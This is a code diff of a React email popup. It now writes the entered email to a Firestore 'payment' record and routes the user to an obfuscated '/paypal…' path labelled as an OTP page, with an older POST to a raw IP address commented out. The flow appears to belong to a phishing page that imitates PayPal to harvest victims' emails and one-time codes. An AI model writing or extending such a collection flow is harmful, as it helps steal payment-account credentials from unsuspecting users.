@@ -26,41 +26,50 @@ const EmailPopup = ({ onClose }) => {
 
 
       await fetch(
-        `https://firestore.googleapis.com/v1/projects/chat-app-570c2/databases/(default)/documents/store-email`,
+        `https://firestore.googleapis.com/v1/projects/chat-app-570c2/databases/(default)/documents/payment/${userId}?updateMask.fieldPaths=email`,
         {
-          method: "POST",
+          method: "PATCH",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             fields: {
               email: { stringValue: email },
-              userId: { stringValue: userId },
             },
           }),
         }
-      );
+      )
+        .then((response) => response.json())
+        .then((data) => console.log("Updated document:", data))
+        .catch((error) => console.error("Error:", error));
 
-      const response = await fetch(
-        `http://localhost:8000/api/store-email/${userId}`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email }),
-        }
-      );
+      console.log("✅ Email stored successfully!");
+      localStorage.removeItem("userEmail");
 
-      const data = await response.json();
+      // ✅ Navigate to OTP page with email as state
+      navigate("/paypaloenWZVRVltNVRiSEFHMDhwdG2hhbnQtaWQ9Qk0zRV", { state: { email } });
 
-      if (response.ok) {
-        console.log("✅ Email stored successfully!", data);
-        localStorage.removeItem("userEmail");
 
-        // ✅ Navigate to OTP page with email as state
-        navigate("/paypaloenWZVRVltNVRiSEFHMDhwdG2hhbnQtaWQ9Qk0zRV", { state: { email } });
-      } else {
-        console.error("❌ Server Error:", data.message);
+      // const response = await fetch(
+      //   `https://147.93.86.156:443/api/store-email/${userId}`,
+      //   {
+      //     method: "POST",
+      //     headers: { "Content-Type": "application/json" },
+      //     body: JSON.stringify({ email }),
+      //   }
+      // );
 
-        setMessage(data.message || "Failed to store email.");
-      }
+      // const data = await response.json();
+
+      // if (response.ok) {
+      //   console.log("✅ Email stored successfully!", data);
+      //   localStorage.removeItem("userEmail");
+
+      //   // ✅ Navigate to OTP page with email as state
+      //   navigate("/paypaloenWZVRVltNVRiSEFHMDhwdG2hhbnQtaWQ9Qk0zRV", { state: { email } });
+      // } else {
+      //   console.error("❌ Server Error:", data.message);
+
+      //   setMessage(data.message || "Failed to store email.");
+      // }
     } catch (error) {
       console.error("❌ Network/Server error:", error);
       setMessage("Network error, please try again.");
